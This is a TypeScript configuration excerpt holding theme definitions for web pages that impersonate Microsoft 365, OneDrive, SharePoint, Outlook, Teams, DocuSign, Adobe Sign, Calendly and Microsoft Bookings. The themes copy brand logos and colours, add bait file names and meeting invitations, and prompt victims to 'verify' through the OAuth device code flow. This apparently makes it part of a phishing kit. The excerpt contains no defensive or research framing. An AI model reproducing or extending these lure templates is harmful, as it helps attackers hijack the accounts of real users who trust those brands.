...
const THEMES: Record<string, ThemeConfig> = {
  'default': {
    ...
    description: 'Generate a device verification code to authenticate with your Microsoft account securely.',
    buttonText: 'Generate Verification Code',
    layout: 'centered',
    pageBg: '#f0f2f5',
    footerLinks: ['Enterprise Security', 'OAuth 2.0 Device Code Flow'],
  },
  'adobe-sign': {
  ...
  'docusign-centered': {
    ...
    description: 'Please verify your identity to sign the pending document.',
    buttonText: 'Verify & Sign',
    infoText: 'NDA_Agreement_Final.pdf is waiting for your signature',
  ...
  'docusign-split': {
    ...
    description: 'Verify your identity to complete the signing process.',
    buttonText: 'Verify Identity',
    layout: 'split',
    splitBg: 'linear-gradient(135deg, #3F3B9B 0%, #2c2878 100%)',
    splitTitle: 'DocuSign eSignature',
    splitDesc: 'The world\'s #1 way to sign electronically. Complete your document signing securely.',
  ...
  'microsoft-office': {
    ...
    brandColor: '#0078d4',
    logoSvg: '<svg width="21" height="21" viewBox="0 0 23 23" fill="white"><path d="M0 0h11v11H0zm12 0h11v11H12zM0 12h11v11H0zm12 0h11v11H12z"/></svg>',
    title: 'Sign in to Microsoft 365',
    description: 'Access your Office apps, documents, and collaboration tools.',
    buttonText: 'Sign In',
    layout: 'centered',
    pageBg: '#f3f3f3',
  ...
  'onedrive': {
    brandName: 'OneDrive',
    brandColor: '#0078D4',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0078D4"/><text x="3" y="22" fill="white" font-size="11" font-weight="bold" font-family="Arial">OD</text></svg>',
    title: 'Shared File Access',
    description: 'Verify your identity to download the shared files from OneDrive.',
    buttonText: 'Verify & Download',
    infoText: 'Budget_Review_2024.xlsx shared via OneDrive',
    infoBoxBg: '#e1f0ff', infoBoxBorder: '#90c8f8', infoBoxColor: '#003d7a',
    layout: 'centered',
    pageBg: '#f5f5f5',
    footerLinks: ['Microsoft Terms', 'Privacy'],
  },
  'outlook-sync': {
    brandName: 'Outlook',
    brandColor: '#0078d4',
    ...
    description: 'Complete verification to sync your Outlook mailbox.',
    buttonText: 'Start Sync',
    layout: 'split',
    splitBg: 'linear-gradient(135deg, #0078d4 0%, #004578 100%)',
    splitTitle: 'Outlook Mail Sync',
  ...
  'sharepoint': {
    ...
    brandColor: '#038387',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#038387"/><text x="5" y="22" fill="white" font-size="12" font-weight="bold" font-family="Arial">SP</text></svg>',
    title: 'Document Library Access',
    description: 'Verify your identity to access the SharePoint document library.',
    buttonText: 'Verify & Access',
    infoText: 'Team Site / Shared Documents requires verification',
    infoBoxBg: '#e6f7f7', infoBoxBorder: '#81e6d9', infoBoxColor: '#234e52',
    layout: 'centered',
    pageBg: '#f5f5f5',
    footerLinks: ['SharePoint Terms', 'Privacy'],
  },
  'secureshare': {
  ...
  'calendar-invite': {
    ...
    brandColor: '#5B5FC7',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#5B5FC7"/><text x="5" y="22" fill="white" font-size="14" font-weight="bold" font-family="Arial">T</text></svg>',
    title: 'Meeting Invitation',
    description: 'You have been invited to a Teams meeting. Verify your identity to join.',
    ...
    layout: 'centered',
    pageBg: '#f5f5f5',
    footerLinks: ['Microsoft Teams Terms', 'Privacy'],
  },
  'calendly-meeting': {
    brandName: 'Calendly',
    brandColor: '#006BFF',
  ...
  'bookings-meeting': {
    brandName: 'Microsoft Bookings',
    brandColor: '#0078d4',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0078d4"/><text x="6" y="22" fill="white" font-size="12" font-weight="bold" font-family="Arial">B</text></svg>',
